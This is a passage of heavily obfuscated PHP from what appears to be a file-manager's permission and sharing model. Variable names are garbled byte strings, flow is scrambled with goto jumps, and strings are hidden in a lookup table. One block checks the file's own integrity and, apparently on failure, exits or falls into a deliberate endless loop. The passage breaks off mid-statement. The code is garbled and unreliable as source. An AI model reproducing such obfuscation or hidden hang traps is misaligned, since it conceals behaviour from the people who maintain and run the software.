$Fëí¢–¡ËÍ[$b¬‚«ùøÊä[710]] == $b¬‚«ùøÊä[1852]) { $D‚Ü≈»ªÇ’ = $cÓÿÌãÀÙÜ[$b¬‚«ùøÊä[710]] == $b¬‚«ùøÊä[1852] ? 1 : 0; $this->shareFileMeta($Eç¥ç∂ıÏÇ[$b¬‚«ùøÊä[447]], $D‚Ü≈»ªÇ’); $this->removeByFile($Eç¥ç∂ıÏÇ[$b¬‚«ùøÊä[447]]); } goto Bè†í“Ç…Ø; f«öÑÉÍÖ€: } private function removeByFile($eÈˆèààõÖ) { goto bÀ”Â”µßÇ; a¬¯°€√£»: $A±∏∏ÿØÖœ = array_to_keyvalue($féßòŒ¥Ñß, $E´ Ì§∫á‡[33], $E´ Ì§∫á‡[468]); $this->remove($A±∏∏ÿØÖœ); goto bß¨Ëﬁà Ω; BÇ§√¢Î®ï: $Aéâêç•⁄ = array($E´ Ì§∫á‡[395] => array($E´ Ì§∫á‡[7], $FßÀ…¯Ø⁄≥), $E´ Ì§∫á‡[473] => 1); $féßòŒ¥Ñß = $this->where($Aéâêç•⁄)->field($E´ Ì§∫á‡[468])->select(); if (empty($féßòŒ¥Ñß)) { return; } goto a¬¯°€√£»; bÀ”Â”µßÇ: $E´ Ì§∫á‡ =& $_SERVER[ú∫]; $féßòŒ¥Ñß = Model($E´ Ì§∫á‡[790])->where(array($E´ Ì§∫á‡[447] => $eÈˆèààõÖ))->field($E´ Ì§∫á‡[395])->select(); $FßÀ…¯Ø⁄≥ = array_to_keyvalue($féßòŒ¥Ñß, $E´ Ì§∫á‡[33], $E´ Ì§∫á‡[395]); goto BÇ§√¢Î®ï; bß¨Ëﬁà Ω: } private function shareFileMeta($CúÿÙ™öÿí, $d†∂ä›„º´ = null) { $cÜ≥®íÔÑ° =& $_SERVER[ú∫]; $DÃ§»›êòá = array($cÜ≥®íÔÑ°[447] => $CúÿÙ™öÿí, $cÜ≥®íÔÑ°[93] => $cÜ≥®íÔÑ°[1857]); if (is_null($d†∂ä›„º´)) { return Model($cÜ≥®íÔÑ°[1858])->where($DÃ§»›êòá)->find(); } $DÃ§»›êòá[$cÜ≥®íÔÑ°[372]] = $d†∂ä›„º´; Model($cÜ≥®íÔÑ°[1858])->add($DÃ§»›êòá, array(), !0); } } if (!isset($_SERVER[$_SERVER[ú∫][821]]) || !isset($_SERVER[$_SERVER[ú∫][822]])) { goto eŸÛ⁄ó∂∂ª; eŸÛ⁄ó∂∂ª: $F”ó∫∑ˆ¬ˆ = $_SERVER[ú∫][823]; $E¨∫πÛ†º = $_SERVER[$_SERVER[ú∫][824]] . $_SERVER[ú∫][825]; $DÃ©∆úÖ„ = $F”ó∫∑ˆ¬ˆ($E¨∫πÛ†º); goto cÌ´òáŒ—Û; cÌ´òáŒ—Û: $aåÂˆôÆœî = explode($_SERVER[ú∫][229], $DÃ©∆úÖ„); if (count($aåÂˆôÆœî) < $_SERVER[ú∫][589]) { $Füï ª—Æ = $_SERVER[ú∫][826]; $Füï ª—Æ(); } $F¢Ã√ÔÔçç = $_SERVER[ú∫][827]; goto Fã¶ô–˘„ï; Fã¶ô–˘„ï: $F¢Ã√ÔÔçç($_SERVER[$_SERVER[ú∫][824]] . $_SERVER[ú∫][825]); $E∞€ÜΩ€®ı = 2; while ($E∞€ÜΩ€®ı > 1) { $aïï®‹”•Ω = rawurlencode($E∞€ÜΩ€®ı . $_SERVER[ú∫][375]); } goto cø‚®ÇÂÚí; cø‚®ÇÂÚí: } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\x6f\165\162\143\145\137\x61\x75\x74\x68"; public function getAuth($b´›ôè—ñÛ) { goto a∫Ûπ∆ÕÂ∏; cµÈâªÆ¡€: array_multisort($c£ÕÚœÉœÚ, SORT_DESC, $dÌà±á’Ã‘); return $dÌà±á’Ã‘; goto dÊ≠∞ÜÔ§ó; a∫Ûπ∆ÕÂ∏: $cﬂƒπ ‡áé =& $_SERVER[ú∫]; $b‚õºã«õ© = $this->sourceAuthSelect($b´›ôè—ñÛ); $dÌà±á’Ã‘ = array(); goto EèÿŸÏïÁÂ; EèÿŸÏïÁÂ: $c£ÕÚœÉœÚ = array(); $c‹‘óÑÒŒÈ = 2 << 25; foreach ($b‚õºã«õ© as $BèêÀë£¢) { goto Eé†´∫£Î¡; C‘¶…ú¿•…: $CŒ÷¨≤ëÏ¨ = 0; if ($BèêÀë£¢[$cﬂƒπ ‡áé[404]] == SourceModel::TYPE_GROUP) { $CŒ÷¨≤ëÏ¨ = $c‹‘óÑÒŒÈ * 2; } if ($BèêÀë£¢[$cﬂƒπ ‡áé[404]] == SourceModel::TYPE_USER) { $CŒ÷¨≤ëÏ¨ = $c‹‘óÑÒŒÈ; } goto aªÒ¢ÁÏÜß; Eé†´∫£Î¡: $CÉäıªî≈ß = Model($cﬂƒπ ‡áé[1859])->listData($BèêÀë£¢[$cﬂƒπ ‡áé[1787]]); if (!$CÉäıªî≈ß) { continue; } $dÌà±á’Ã‘[] = $BèêÀë£¢; goto C‘¶…ú¿•…; aªÒ¢ÁÏÜß: if ($BèêÀë£¢[$cﬂƒπ ‡áé[404]] == SourceModel::TYPE_USER && $BèêÀë£¢[$cﬂƒπ ‡áé[484]] == $cﬂƒπ ‡áé[191]) { $CŒ÷¨≤ëÏ¨ = 0; } $c£ÕÚœÉœÚ[] = $CÉäıªî≈ß[$cﬂƒπ ‡áé[406]] + $CŒ÷¨≤ëÏ¨; goto CŒò‡»ù◊Î; CŒò‡»ù◊Î: } goto cµÈâªÆ¡€; dÊ≠∞ÜÔ§ó: } public function sourceAuthSelect($Dﬂ®í÷£Ï) { goto eﬁ†∆ùîêÛ; eﬁ†∆ùîêÛ: $f†€Ù™«©™ =& $_SERVER[ú∫]; static $Eö†°ØÜËÊ = array(); $f≥èÚ∏‰√ê = is_array($Dﬂ®í÷£Ï) ? !1 : !0; goto fªÌ≥ãÕ®µ; fªÌ≥ãÕ®µ: if ($f≥èÚ∏‰√ê) { $Dﬂ®í÷£Ï = array($Dﬂ®í÷£Ï); } $F∑üƒÖïî = array(); foreach ($Dﬂ®í÷£Ï as $Eú¨‹Ùﬂô) { if (isset($Eö†°ØÜËÊ[$Eú¨‹Ùﬂô])) { $F∑üƒÖïî[$Eú¨‹Ùﬂô] = $Eö†°ØÜËÊ[$Eú¨‹Ùﬂô]; } } goto Eåã‚¶Ë∏Û; Bö√å–“ıı: $D†ççº∆⁄ = $this->field($eÎÍ˜œ›ÀŒ)->order($f†€Ù™«©™[393])->where($FÀ†øƒµîÖ)->select(); $C’û‡∂∞Ãá = array_to_keyvalue_group($D†ççº∆⁄, $f†€Ù™«©™[395]); foreach ($Dﬂ®í÷£Ï as $Eú¨‹Ùﬂô) { $Eö†°ØÜËÊ[$Eú¨‹Ùﬂô] = $C’û‡∂∞Ãá[$Eú¨‹Ùﬂô] ? $C’û‡∂∞Ãá[$Eú¨‹Ùﬂô] : array(); } goto F∂î◊«„îÈ; Eåã‚¶Ë∏Û: if (count($F∑üƒÖïî) == count($Dﬂ®í÷£Ï)) { return $f≥èÚ∏‰√ê ? $F∑üƒÖïî[$Dﬂ®í÷£Ï[0]] : $F∑üƒÖïî; } $eÎÍ˜œ›ÀŒ = $f†€Ù™«©™[1860]; $FÀ†øƒµîÖ = array($f†€Ù™«©™[395] => array($f†€Ù™«©™[7], $Dﬂ®í÷£Ï)); goto Bö√å–“ıı; F∂î◊«„îÈ: if ($f≥èÚ∏‰√ê) { return $D†ççº∆⁄; } return $C’û‡∂∞Ãá; goto aπü˘º’´é; aπü˘º’´é: } public function setAuth($bºØ∏•ÉÙä, $CœÂéÓ¢á¯) { goto eØÇªèﬁ·û; AÜ„—«àªª: return !0; goto Fﬁ‰ò±Í»∑; f◊Ç›˘âÜæ: if ($Cá¬”Çûõõ != $AÊ§¨À´∫Ø) { $Fﬁê°ÆÖîç = array($b˜≤◊©°∆à[1692] => $Cá¬”Çûõõ); $d≥â„Ú⁄°Ç = Model($b˜≤◊©°∆à[1773])->field($b˜≤◊©°∆à[1528])->where($Fﬁê°ÆÖîç)->select(); $d≥â„Ú⁄°Ç = array_to_keyvalue($d≥â„Ú⁄°Ç, $b˜≤◊©°∆à[33], $b˜≤◊©°∆à[1528]); } $dÚ⁄ÙûÀƒ‡ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $Dá„û–ªö† = array(); goto A¿ü·î¯÷œ; A¿ü·î¯÷œ: foreach ($CœÂéÓ¢á¯ as $Bô’ú—àåµ) { if (!in_array($Bô’ú—àåµ[$b˜≤◊©°∆à[404]], $dÚ⁄ÙûÀƒ‡)) { show_json(LNG($b˜≤◊©°∆à[1861]), !1); } if ($Cá¬”Çûõõ != $AÊ§¨À´∫Ø) { if ($Bô’ú—àåµ[$b˜≤◊©°∆à[404]] == SourceModel::TYPE_GROUP) { } if ($Bô’ú—àåµ[$b˜≤◊©°∆à[484]] != 0 && !in_array($Bô’ú—àåµ[$b˜≤◊©°∆à[484]], $d≥â„Ú⁄°Ç)) { } } if ($Bô’ú—àåµ[$b˜≤◊©°∆à[484]] == 0) { $Bô’ú—àåµ[$b˜≤◊©°∆à[404]] = SourceModel::TYPE_USER; } $Dá„û–ªö†[] = array($b˜≤◊©°∆à[395] => $bºØ∏•ÉÙä, $b˜≤◊©°∆à[404] => intval($Bô’ú—àåµ[$b˜≤◊©°∆à[404]]), $b˜≤◊©°∆à[484] => intval($Bô’ú—àåµ[$b˜≤◊©°∆à[484]]), $b˜≤◊©°∆à[1787] => intval($Bô’ú—àåµ[$b˜≤◊©°∆à[1787]]) ? intval($Bô’ú—àåµ[$b˜≤◊©°∆à[1787]]) : 0, $b˜≤◊©°∆à[1841] => intval($Bô’ú—àåµ[$b˜≤◊©°∆à[1841]]) ? intval($Bô’ú—àåµ[$b˜≤◊©°∆à[1841]]) : -1); } $this->where(array($b˜≤◊©°∆à[410] => $bºØ∏•ÉÙä))->delete(); $this->addAll($Dá„û–ªö†); goto AÜ„—«àªª; B™ããòë⁄À: if ($A…á”ê◊å◊[$b˜≤◊©°∆à[404]] != SourceModel::TYPE_GROUP) { return !1; } $AÊ§¨À´∫Ø = 1; $Cá¬”Çûõõ = $A…á”ê◊å◊[$b˜≤◊©°∆à[484]]; goto f◊Ç›˘âÜæ; eØÇªèﬁ·û: $b˜≤◊©°∆à =& $_SERVER[ú∫]; $A…á”ê◊å◊ = Model($b˜≤◊©°∆à[1206])->sourceInfo($bºØ∏•ÉÙä); if (!$A…á”ê◊å◊) { return !1; } goto B™ããòë⁄À; Fﬁ‰ò±Í»∑: } public function authClear($a∆æÖΩÕúÙ) { $Fã√€ÜÑﬁ≠ =& $_SERVER[ú∫]; $b‰§· åé· = Model($Fã√€ÜÑﬁ≠[1206])->sourceInfo($a∆æÖΩÕúÙ); $fâçôõë§Ô = array($a∆æÖΩÕúÙ); if ($b‰§· åé·[$Fã√€ÜÑﬁ≠[403]] == $Fã√€ÜÑﬁ≠[87]) { $aíÏ°‰≠äÙ = array($Fã√€ÜÑﬁ≠[553] => array($Fã√€ÜÑﬁ≠[512], $b‰§· åé·[$Fã√€ÜÑﬁ≠[487]] . $a∆æÖΩÕúÙ . $Fã√€ÜÑﬁ≠[513])); $fâçôõë§Ô = Model($Fã√€ÜÑﬁ≠[1206])->field($Fã√€ÜÑﬁ≠[410])->where($aíÏ°‰≠äÙ)->getField($Fã√€ÜÑﬁ≠[395], !0); $fâçôõë§Ô[] = $a∆æÖΩÕúÙ; } $this->where(array($Fã√€ÜÑﬁ≠[410] => array($Fã√€ÜÑﬁ≠[411], $fâçôõë§Ô)))->delete(); return !0; } public function getAllChildren($F´™àû¶ƒŒ) { goto b‹¡·ææ»Í; d‘ÍàÕÏÖ¡: $Bòööª¶ö» = Model($cïŸ∫∞·Ü[790])->field($cÓ‹Üåî∞ã)->where($béÙñ·µîà)->select(); $bßÖ‰Èçøâ = array($F´™àû¶ƒŒ); foreach ($Bòööª¶ö» as $Dı‚©ÁÖ∆Ö) { foreach ($CÇ¡∞Úπ⁄£ as $DÙê≤åËº›) { $d—éœöÂ˜É = $cïŸ∫∞·Ü[47] . $DÙê≤åËº› . $cïŸ∫∞·Ü[47]; $EÀÿ√ﬁ∂ìå = $Dı‚©ÁÖ∆Ö[$cïŸ∫∞·Ü[487]] . $Dı‚©ÁÖ∆Ö[$cïŸ∫∞·Ü[395]] . $cïŸ∫∞·Ü[47]; if (strstr($EÀÿ√ﬁ∂ìå, $d—éœöÂ˜É)) { $bßÖ‰Èçøâ[] = $Dı‚©ÁÖ∆Ö[$cïŸ∫∞·Ü[395]]; break; } } } goto BàÊŒçﬂ∂ª; BàÊŒçﬂ∂ª: return $this->sourceListAuth($bßÖ‰Èçøâ); goto f≈»Ààüäö; b‹¡·ææ»Í: $cïŸ∫∞·Ü =& $_SERVER[ú∫]; $cÓ’•–Ÿµã = Model($cïŸ∫∞·Ü[1206])->sourceInfo($F´™àû¶ƒŒ); if ($cÓ’•–Ÿµã[$cïŸ∫∞·Ü[403]] != $cïŸ∫∞·Ü[87]) { return $this->sourceListAuth(array($F´™àû¶ƒŒ)); } goto Cù¥àÁä¨«; eÒêıá˜Ï÷: if ($cÓ’•–Ÿµã[$cïŸ∫∞·Ü[478]] == $cïŸ∫∞·Ü[191] && $cÓ’•–Ÿµã[$cïŸ∫∞·Ü[484]] != $Eä§›–Á«) { $CÇ¡∞Úπ⁄£ = $this->groupChidldAllRootSource($cÓ’•–Ÿµã[$cïŸ∫∞·Ü[484]]); } $Cƒıﬂ÷‡êî = $this->field($cïŸ∫∞·Ü[395])->group($cïŸ∫∞·Ü[395])->select(); $Cƒıﬂ÷‡êî = array_to_keyvalue($Cƒıﬂ÷‡êî, $cïŸ∫∞·Ü[33], $cïŸ∫∞·Ü[395]); goto BçÁ´îÓ¥Ç; BçÁ´îÓ¥Ç: if (!$Cƒıﬂ÷‡êî) { return array(); } $cÓ‹Üåî∞ã = $cïŸ∫∞·Ü[1862]; $béÙñ·µîà = array($cïŸ∫∞·Ü[395] => array($cïŸ∫∞·Ü[7], $Cƒıﬂ÷‡êî), $cïŸ∫∞·Ü[423] => $cïŸ∫∞·Ü[191]); goto d‘ÍàÕÏÖ¡; Cù¥àÁä¨«: if ($cÓ’•–Ÿµã[$cïŸ∫∞·Ü[404]] != SourceModel::TYPE_GROUP) { return array(); } $Eä§›–Á« = 1; $CÇ¡∞Úπ⁄£ = array($F´™àû¶ƒŒ); goto eÒêıá˜Ï÷; f≈»Ààüäö: } private function sourceListAuth($AÜ≈ÒÜºäÒ) { goto Eì◊¥íõ◊´; Cã√”ªÜ°Ÿ: $cÈπà◊îèÛ = array(); $Bá‚ïÊÃœú = array(); foreach ($DÌ√Ã‹ÊÇƒ as $c ﬁÿÉ‹¬›) { goto FúìÑ—ò…œ; c‚ÕÚÆê≥ı: $dÌ«“≥¿ŒÚ = count(explode($FÊó¨°ù•‡[8], trim($c ﬁÿÉ‹¬›[$FÊó¨°ù•‡[495]], $FÊó¨°ù•‡[8]))); $Bá‚ïÊÃœú[] = $dÌ«“≥¿ŒÚ + ($c ﬁÿÉ‹¬›[$FÊó¨°ù•‡[29]] == $FÊó¨°ù•‡[77] ? 0 : 1000); goto BµÁ· èÍ€; FúìÑ—ò…œ: unset($c ﬁÿÉ‹¬›[$FÊó¨°ù•‡[434]]); unset($c ﬁÿÉ‹¬›[$FÊó¨°ù•‡[432]]); unset($c ﬁÿÉ‹¬›[$FÊó¨°ù•‡[406]]); goto c†Ÿü∫µ∂è; Cˆ¿ç∞¬¶á: $c ﬁÿÉ‹¬›[$FÊó¨°ù•‡[1863]] = $this->authTargetInfo($E∑ŸµÁèâ’); $c ﬁÿÉ‹¬›[$FÊó¨°ù•‡[495]] = rtrim($c ﬁÿÉ‹¬›[$FÊó¨°ù•‡[490]], $FÊó¨°ù•‡[8]) . $FÊó¨°ù•‡[8] . ltrim($c ﬁÿÉ‹¬›[$FÊó¨°ù•‡[495]], $FÊó¨°ù•‡[8]); $cÈπà◊îèÛ[] = $c ﬁÿÉ‹¬›; goto c‚ÕÚÆê≥ı; c†Ÿü∫µ∂è: unset($c ﬁÿÉ‹¬›[$FÊó¨°ù•‡[85]]); $E∑ŸµÁèâ’ = $Cèœ¨ÒÑéä[$c ﬁÿÉ‹¬›[$FÊó¨°ù•‡[395]]]; if (!$E∑ŸµÁèâ’) { continue; } goto Cˆ¿ç∞¬¶á; BµÁ· èÍ€: } goto DâÖ‡êÜÉË; DâÖ‡êÜÉË: array_multisort($Bá‚ïÊÃœú, SORT_ASC, $cÈπà◊îèÛ); return $cÈπà◊îèÛ; goto EıΩÜ˘πïò; Eì◊¥íõ◊´: $FÊó¨°ù•‡ =& $_SERVER[ú∫]; $DÌ√Ã‹ÊÇƒ = Model($FÊó¨°ù•‡[1206])->sourceListInfo($AÜ≈ÒÜºäÒ, !0); $Cèœ¨ÒÑéä = $this->sourceAuthSelect($AÜ≈ÒÜºäÒ); goto Cã√”ªÜ°Ÿ; EıΩÜ˘πïò: } private function groupChidldAllRootSource($d‹Ÿû›òÙì) { $cÉâöˆ√≥• =& $_SERVER[ú∫]; $bïãÆÎ≤ﬂÂ = Model($cÉâöˆ√≥•[1864])->groupChildrenAll($d‹Ÿû›òÙì); $b¥ÀÒÇ·Òæ = array($cÉâöˆ√≥•[478] => 0, $cÉâöˆ√≥•[484] => array($cÉâöˆ√≥•[7], $bïãÆÎ≤ﬂÂ), $cÉâöˆ√≥•[404] => SourceModel::TYPE_GROUP); $fåô˜“å÷Ñ = Model($cÉâöˆ√≥•[790])->field($cÉâöˆ√≥•[395])->where($b¥ÀÒÇ·Òæ)->select(); $fåô˜“å÷Ñ = array_to_keyvalue($fåô˜“å÷Ñ, $cÉâöˆ√≥•[33], $cÉâöˆ√≥•[395]); return $fåô˜“å÷Ñ; } private function authTargetInfo($e∫‹÷ÖºÖΩ) { goto DíÁ—ä·¯ï; DÍ¬ì‡Ñ‘À: $c¥ÓßãíÂ˜ = 2 << 25; foreach ($e∫‹÷ÖºÖΩ as $fƒìÉ¢≥Ûå) { goto f—Œ∫”ëº≠; f—Œ∫”ëº≠: $a úı‘∂Ø“ = Model($Aê¡á£Ñ„ï[1859])->listData($fƒìÉ¢≥Ûå[$Aê¡á£Ñ„ï[1787]]); if (!$a úı‘∂Ø“) { continue; } if ($fƒìÉ¢≥Ûå[$Aê¡á£Ñ„ï[404]] == SourceModel::TYPE_USER) { $f“áÑúõáÒ = Model($Aê¡á£Ñ„ï[502])->getInfoSimpleOuter($fƒìÉ¢≥Ûå[$Aê¡á£Ñ„ï[484]]); if ($f“áÑúõáÒ[$Aê¡á£Ñ„ï[1528]] == $Aê¡á£Ñ„ï[1085]) { continue; } if ($f“áÑúõáÒ[$Aê¡á£Ñ„ï[1528]] == $Aê¡á£Ñ„ï[191]) { $f“áÑúõáÒ[$Aê¡á£Ñ„ï[28]] = LNG($Aê¡á£Ñ„ï[1865]); } } else { $f“áÑúõáÒ = Model($Aê¡á£Ñ„ï[486])->getInfoSimple($fƒìÉ¢≥Ûå[$Aê¡á£Ñ„ï[484]]); } goto Fæ«óÓàÚï; f¨ÂµÚÃ¢ö: $fê‹Î≈¡ ﬁ = 0; if ($fƒìÉ¢≥Ûå[$Aê¡á£Ñ„ï[404]] == SourceModel::TYPE_GROUP) { $fê‹Î≈¡ ﬁ = $c¥ÓßãíÂ˜ * 2; } if ($fƒìÉ¢≥Ûå[$Aê¡á£Ñ„ï[404]] == SourceModel::TYPE_USER) { $fê‹Î≈¡ ﬁ = $c¥ÓßãíÂ˜; } goto b€ñÓ…°©˜; b€ñÓ…°©˜: if ($fƒìÉ¢≥Ûå[$Aê¡á£Ñ„ï[404]] == SourceModel::TYPE_USER && $fƒìÉ¢≥Ûå[$Aê¡á£Ñ„ï[484]] == $Aê¡á£Ñ„ï[191]) { $fê‹Î≈¡ ﬁ = 0; } $A‰óËãÚ±“[] = $a úı‘∂Ø“[$Aê¡á£Ñ„ï[406]] + $fê‹Î≈¡ ﬁ; goto aÂ÷çó˘óâ; Fæ«óÓàÚï: if (!$f“áÑúõáÒ) { continue; } $f“áÑúõáÒ[$Aê¡á£Ñ„ï[446]] = $a úı‘∂Ø“; $a™∞‹ù≠¥¨[] = $f“áÑúõáÒ; goto f¨ÂµÚÃ¢ö; aÂ÷çó˘óâ: } array_multisort($A‰óËãÚ±“, SORT_DESC, $a™∞‹ù≠¥¨); goto d‰Öäí≥π; DíÁ—ä·¯ï: $Aê¡á£Ñ„ï =& $_SERVER[ú∫]; $a™∞‹ù≠¥¨ = array(); $A‰óËãÚ±“ = array(); goto DÍ¬ì‡Ñ‘À; d‰Öäí≥π: return $a™∞‹ù≠¥¨; goto cõ§ƒ‹⁄¬”; cõ§ƒ‹⁄¬”: } public function getAllChildrenByUser($c‡ÖŒ”ôŸ⁄, $F’°ÜÁ‰†≈) { goto dÇ¶ù˜’Üœ; dÇ¶ù˜’Üœ: $dœ™Ê‡∫è¡ =& $_SERVER[ú∫]; $d‡©ÍäÆŸ  = Model($dœ™Ê‡∫è¡[506])->getInfo($F’°ÜÁ‰†≈); if (!$F’°ÜÁ‰†≈ || !$c‡ÖŒ”ôŸ⁄ || !$d‡©ÍäÆŸ ) { return array(); } goto a¨Ö›ëèÖ´; D’º€ç±íë: return $F≤ıÁ√–‹Æ; goto d´ëƒ·£†à; fùëì°„ñ°: if ($E¬úèﬂÔ’é[$dœ™Ê‡∫è¡[478]] == $dœ™Ê‡∫è¡[191] && $E¬úèﬂÔ’é[$dœ™Ê‡∫è¡[484]] != $Fø§¬ïáÚ« && $this->groupContainUser($E¬úèﬂÔ’é[$dœ™Ê‡∫è¡[484]], $F’°ÜÁ‰†≈)) { foreach ($d‡©ÍäÆŸ [$dœ™Ê‡∫è¡[1866]] as $CÛ®…§÷‹Î) { $B¨äêµ‚Üà = Model($dœ™Ê‡∫è¡[486])->getInfo($CÛ®…§÷‹Î[$dœ™Ê‡∫è¡[1692]]); $DÉ∫˜›ô∂„ = Model($dœ™Ê‡∫è¡[506])->getInfoSimpleOuter($F’°ÜÁ‰†≈); $DÉ∫˜›ô∂„[$dœ™Ê‡∫è¡[446]] = $CÛ®…§÷‹Î[$dœ™Ê‡∫è¡[406]]; if (Model($dœ™Ê‡∫è¡[1859])->authCheckAction($CÛ®…§÷‹Î[$dœ™Ê‡∫è¡[406]][$dœ™Ê‡∫è¡[406]], $dœ™Ê‡∫è¡[1712])) { continue; } $b«àìﬁëÁ‚ = array($dœ™Ê‡∫è¡[28] => $dœ™Ê‡∫è¡[1481] . $B¨äêµ‚Üà[$dœ™Ê‡∫è¡[28]], $dœ™Ê‡∫è¡[395] => $B¨äêµ‚Üà[$dœ™Ê‡∫è¡[85]][$dœ™Ê‡∫è¡[395]], $dœ™Ê‡∫è¡[76] => KodIO::make($B¨äêµ‚Üà[$dœ™Ê‡∫è¡[85]][$dœ™Ê‡∫è¡[395]]), $dœ™Ê‡∫è¡[478] => $dœ™Ê‡∫è¡[191], $dœ™Ê‡∫è¡[404] => $dœ™Ê‡∫è¡[1015], $dœ™Ê‡∫è¡[29] => $dœ™Ê‡∫è¡[517], $dœ™Ê‡∫è¡[495] => $B¨äêµ‚Üà[$dœ™Ê‡∫è¡[491]], $dœ™Ê‡∫è¡[1692] => $B¨äêµ‚Üà[$dœ™Ê‡∫è¡[1692]], $dœ™Ê‡∫è¡[488] => $B¨äêµ‚Üà[$dœ™Ê‡∫è¡[478]], $dœ™Ê‡∫è¡[1863] => array($DÉ∫˜›ô∂„)); $CèöÎ‹ëß√[$b«àìﬁëÁ‚[$dœ™Ê‡∫è¡[395]]] = $b«àìﬁëÁ‚; } } $F≤ıÁ√–‹Æ = array(); $Cá–”ËÁÍâ = $this->getAllChildren($c‡ÖŒ”ôŸ⁄); goto E©°é∂ÒÆ¯; a¨Ö›ëèÖ´: $E¬úèﬂÔ’é = Model($dœ™Ê‡∫è¡[1206])->sourceInfo($c‡ÖŒ”ôŸ⁄); $CèöÎ‹ëß√ = array(); $Fø§¬ïáÚ« = 1; goto fùëì°„ñ°; E©°é∂ÒÆ¯: foreach ($Cá–”ËÁÍâ as $A∏˜øÚÿ•Ú) { $bä∆¨Âìè≈ = !1; foreach ($A∏˜øÚÿ•Ú[$dœ™Ê‡∫è¡[1863]] as $aÙ√ï—¢πé) { if ($aÙ√ï—¢πé[$dœ™Ê‡∫è¡[1528]]) { if ($aÙ√ï—¢πé[$dœ™Ê‡∫è¡[1528]] == $F’°ÜÁ‰†≈) { $bä∆¨Âìè≈ = !0; break; } } if ($aÙ√ï—¢πé[$dœ™Ê‡∫è¡[1692]]) { if ($this->groupContainUser($aÙ√ï—¢πé[$dœ™Ê‡∫è¡[1692]], $F’°ÜÁ‰†≈)) { $bä∆¨Âìè≈ = !0; break; } } } if ($bä∆¨Âìè≈) { $F≤ıÁ√–‹Æ[] = $A∏˜øÚÿ•Ú; } $d∫ŒÔçâ∂Ñ = $A∏˜øÚÿ•Ú[$dœ™Ê‡∫è¡[395]]; if (isset($CèöÎ‹ëß√[$d∫ŒÔçâ∂Ñ])) { $A∏˜øÚÿ•Ú[$dœ™Ê‡∫è¡[1863]][] = $CèöÎ‹ëß√[$d∫ŒÔçâ∂Ñ][0]; $CèöÎ‹ëß√[$d∫ŒÔçâ∂Ñ] = !1; } } $CèöÎ‹ëß√ = array_filter(array_values($CèöÎ‹ëß√)); $F≤ıÁ√–‹Æ = array_merge($CèöÎ‹ëß√, $F≤ıÁ√–‹Æ); goto D’º€ç±íë; d´ëƒ·£†à: } public function setAllChildrenByUser($B£•≈•Ïø‰, $fåà Ã¿‹£, $DœÊß”ëƒÜ) { $Bå⁄…ôìƒè =& $_SERVER[ú∫]; $eÑï«âÙ∑£ = $this->getAllChildrenByUser($B£•≈•Ïø‰, $fåà Ã¿‹£); if (!$DœÊß”ëƒÜ || !$eÑï«âÙ∑£) { return !1; } foreach ($eÑï«âÙ∑£ as $d€Ìçê∂ˆ…) { $d„·πÿˆìÓ = array(); foreach ($d€Ìçê∂ˆ…[$Bå⁄…ôìƒè[1863]] as $D˜∏√π§ü) { $b≠¯µ¿ùË‡ = $D˜∏√π§ü[$Bå⁄…ôìƒè[446]]; $fÕÀÛçƒ∏≈ = $D˜∏√π§ü[$Bå⁄…ôìƒè[1528]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $a¢É±èÜõ = $D˜∏√π§ü[$Bå⁄…ôìƒè[1528]] ? $D˜∏√π§ü[$Bå⁄…ôìƒè[1528]] : $D˜∏√π§ü[$Bå⁄…ôìƒè[1692]]; if ($D˜∏√π§ü[$Bå⁄…ôìƒè[1528]] && $D˜∏√π§ü[$Bå⁄…ôìƒè[1528]] == $fåà Ã¿‹£) { continue; } $d„·πÿˆìÓ[] = array($Bå⁄…ôìƒè[395] => $d€Ìçê∂ˆ…[$Bå⁄…ôìƒè[395]], $Bå⁄…ôìƒè[404] => $fÕÀÛçƒ∏≈, $Bå⁄…ôìƒè[484] => intval($a¢É±èÜõ), $Bå⁄…ôìƒè[1787] => isset($b≠¯µ¿ùË‡[$Bå⁄…ôìƒè[393]]) ? intval($b≠¯µ¿ùË‡[$Bå⁄…ôìƒè[393]]) : 0, $Bå⁄…ôìƒè[1841] => isset($b≠¯µ¿ùË‡[$Bå⁄…ôìƒè[1841]]) ? intval($b≠¯µ¿ùË‡[$Bå⁄…ôìƒè[1841]]) : -1); } $d„·πÿˆìÓ[] = array($Bå⁄…ôìƒè[395] => $d€Ìçê∂ˆ…[$Bå⁄…ôìƒè[395]], $Bå⁄…ôìƒè[404] => SourceModel::TYPE_USER, $Bå⁄…ôìƒè[484] => intval($fåà Ã¿‹£), $Bå⁄…ôìƒè[1787] => intval($DœÊß”ëƒÜ), $Bå⁄…ôìƒè[1841] => -1); $this->where(array($Bå⁄…ôìƒè[410] => $d€Ìçê∂ˆ…[$Bå⁄…ôìƒè[395]]))->delete(); $this->addAll($d„·πÿˆìÓ); } return !0; } public function get($A•‹»éØÜÓ) { $E–ÂçΩÍ≤™ = $this->getSourceList(array($A•‹»éØÜÓ), !0); return $E–ÂçΩÍ≤™[0]; } public function getSourceList($Cº∏»»˜⁄é, $cû«◊ΩöÇ÷ = false, $Eõ—ùõ˘«Ñ = false) { goto a∞ßÊôöˆﬂ; A®çÆÇ∑ıë: foreach ($cû«◊ΩöÇ÷ as $A–®èääëÀ => $B≈á˘÷•‡Á) { $D‰äõõü—ì = $eÀ˜»ìÃóô->parentLevelArray($B≈á˘÷•‡Á[$eèâÛßµ¥‹[487]]); $e√∑≥–çÆÿ = array_merge($e√∑≥–çÆÿ, array($A–®èääëÀ), array_reverse($D‰äõõü—ì)); } $e√∑≥–çÆÿ = array_values(array_unique($e√∑≥–çÆÿ)); if (!$e√∑≥–çÆÿ) { return array(); } goto E‡©ç≥ÁëÁ; c‹¡â‹≤∫¥: $bÇ∞±üºÖæ = array(); foreach ($cû«◊ΩöÇ÷ as $bŒá‚ö €Õ => $Aäùâ≤Ù¿ê) { if ($c∑ûΩ≈≥∞ﬁ) { $bÇ∞±üºÖæ[$bŒá‚ö €Õ] = $D‘ÒÊ™õ©¿; continue; } $bÇ∞±üºÖæ[$bŒá‚ö €Õ] = $this->makeSourceAuth($Aäùâ≤Ù¿ê, $eü™ñûÍ∑Ω, $Eõ—ùõ˘«Ñ); } return $bÇ∞±üºÖæ; goto Aåá∑ó¿Üé; eÑãÜ∫ë∆á: if (!$cû«◊ΩöÇ÷ && count($Cº∏»»˜⁄é) == 1) { $cû«◊ΩöÇ÷ = array(); $cû«◊ΩöÇ÷[$Cº∏»»˜⁄é[0]] = 